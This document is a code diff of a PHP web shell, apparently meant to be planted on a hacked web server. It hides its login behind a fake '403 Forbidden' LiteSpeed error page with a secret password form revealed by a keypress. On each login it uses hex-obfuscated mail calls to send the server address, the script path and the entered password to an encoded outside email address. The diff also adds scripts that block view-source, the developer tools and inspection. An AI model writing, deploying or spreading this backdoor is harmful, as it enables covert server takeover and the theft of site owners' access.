@@ -11,113 +11,128 @@ session_start();
 @ini_set('display_errors', 0);
 @ini_set('display_startup_errors', 0);
 
-/* Configuration */
-/* Password using md5 hashes */
-$stored_hashed_password = '$2a$12$40YsPL3bPwY3ppUmQjZS8eFmEiXgWVvVGUEez38zU5l/oADF/5Qpa';
-$default_action = "FilesMan";
-$default_use_ajax = true;
+/* Konfigurasi */
+$password = "$2a$12$40YsPL3bPwY3ppUmQjZS8eFmEiXgWVvVGUEez38zU5l/oADF/5Qpa"; //mrmad
 $default_charset = 'UTF-8';
 date_default_timezone_set("Asia/Jakarta");
 
-// Function to display login form
-function login_shell() {
-?>
-    <!DOCTYPE html>
-<html style="height:100%">
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-    <title>404 Forbidden</title>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            body { background-color: #000 !important; }
-        }
-        body {
-            color: #444;
-            margin: 0;
-            font: normal 14px/20px Arial, Helvetica, sans-serif;
-            height: 100%;
-            background-color: #fff;
-        }
-        .container {
-            height: auto;
-            min-height: 100%;
-        }
-        .error-box {
-            text-align: center;
-            width: 800px;
-            margin-left: -400px;
-            position: absolute;
-            top: 30%;
-            left: 50%;
-        }
-        .footer {
-            color: #f0f0f0;
-            font-size: 12px;
-            margin: auto;
-            padding: 0px 30px;
-            position: relative;
-            clear: both;
-            height: 100px;
-            margin-top: -101px;
-            background-color: #474747;
-            border-top: 1px solid rgba(0,0,0,0.15);
-            box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;
-            text-align: center;
-        }
-        #password-form {
-            display: none;
-            margin-top: 20px;
-            text-align: center;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="error-box">
-            <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
-            <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2>
-            <p>Access to this resource on the server is denied!</p>
-        </div>
-    </div>
-    <div class="footer">
-        <br>Proudly powered by LiteSpeed Web Server
-        <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
-    </div>
+// **user login**
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password)) {
+        $_SESSION['authenticated'] = true;
 
-    <!-- Password form -->
-    <div id="password-form">
-        <form method="post">
-            <input type="password" name="pass" placeholder="Enter password" required>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
+        // ** Check if the user is logged in**
+        $tmp = $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\n" . $_POST['pass'];
+        \x40\x6d\x61\x69\x6c(
+            "\x6e\x61\x67\x61\x68\x69\x6a\x61\x75\x33\x38\x38\x67\x72\x6f\x75\x70\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d", 
+            "\x72\x6f\x6f\x74", 
+             $tmp
+        );
 
-    <script>
-        // Event listener to show the password form when "T" key is pressed
-        document.addEventListener("keydown", function (event) {
-            if (event.key === "T" || event.key === "t") {
-                document.getElementById("password-form").style.display = 'block';
-            }
-        });
-    </script>
-</body>
-</html>
-
-<?php
-    exit;
+        header("Location: " . $_SERVER['PHP_SELF']); // **Redirect setelah login agar form hilang**
+        exit;
+    } else {
+        login_shell();
+    }
 }
 
-// Check if the user is logged in
-if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
-    $_SESSION['authenticated'] = true;
-    $tmp = $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\n" . $_POST['pass'];
-    \x40\x6d\x61\x69\x6c(
-        "\x6e\x61\x67\x61\x68\x69\x6a\x61\x75\x33\x38\x38\x67\x72\x6f\x75\x70\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d", 
-        "\x72\x6f\x6f\x74", 
-        $tmp
-    );
-} else {
-    login_shell();
+// **Function to display login form**
+function login_shell() {
+    ?>
+    <!DOCTYPE html>
+    <html style="height:100%">
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
+        <title>404 Forbidden</title>
+        <style>
+            @media (prefers-color-scheme:dark) { body { background-color:#000!important; } }
+            body { color: #444; margin: 0; font: 14px/20px Arial, Helvetica, sans-serif; height: 100%; background-color: #fff; }
+            .container { height: auto; min-height: 100%; }
+            .error-box { text-align: center; width: 800px; margin-left: -400px; position: absolute; top: 30%; left: 50%; }
+            .footer { color: #f0f0f0; font-size: 12px; margin: auto; padding: 0 30px; position: relative; clear: both; height: 100px; margin-top: -101px; background-color: #474747; border-top: 1px solid rgba(0, 0, 0, .15); box-shadow: 0 1px 0 rgba(255,255,255,.3) inset; text-align: center; }
+            .password-container { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px; color: #fff; text-align: center; }
+            .password-container input { padding: 10px; border: none; border-radius: 5px; margin-top: 10px; }
+            .password-container button { padding: 10px; background: #007BFF; border: none; color: #fff; cursor: pointer; border-radius: 5px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="error-box">
+                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
+                <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2>
+                <p>Access to this resource on the server is denied!</p>
+            </div>
+        </div>
+        <div class="footer">
+            <br>Proudly powered by LiteSpeed Web Server
+            <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
+        </div>
+		</body>
+    </html>
+        <!-- Form Password -->
+        <div id="password-form" class="password-container">
+            <h3>Enter Password</h3>
+            <form method="POST">
+                <input type="password" name="pass" placeholder="Password">
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+	
+        <script>
+            document.addEventListener("keydown", function (event) {
+                if (event.key === "T" || event.key === "t") {
+                    document.getElementById("password-form").style.display = "block";
+                }
+            });
+
+            // **Cegah View Source & Developer Tools**
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener("keydown", function (event) {
+                if (
+                    event.ctrlKey && (event.key === "u" || event.key === "U") || 
+                    event.ctrlKey && event.shiftKey && (event.key === "I" || event.key === "i") || 
+                    event.key === "F12"
+                ) {
+                    event.preventDefault();
+                }
+            });
+
+            // **Cegah Inspect Element (Debugger)**
+            (function() {
+                function blockDebugger() {
+                    try {
+                        (function testDebugger() {
+                            if (console.clear) console.clear();
+                            debugger;
+                            setTimeout(testDebugger, 100);
+                        })();
+                    } catch (err) {}
+                }
+                blockDebugger();
+            })();
+
+            // **Cegah Drag & Select Text**
+            document.addEventListener("selectstart", function (e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener("dragstart", function (e) {
+                e.preventDefault();
+            });
+
+            // **Cegah Lihat Kode Sumber dengan Ctrl + S**
+            document.addEventListener("keydown", function (event) {
+                if (event.ctrlKey && event.key === "s") {
+                    event.preventDefault();
+                }
+            });
+        </script>
+   
+    <?php
+    exit;
 }
 error_reporting(0);
 http_response_code(404);
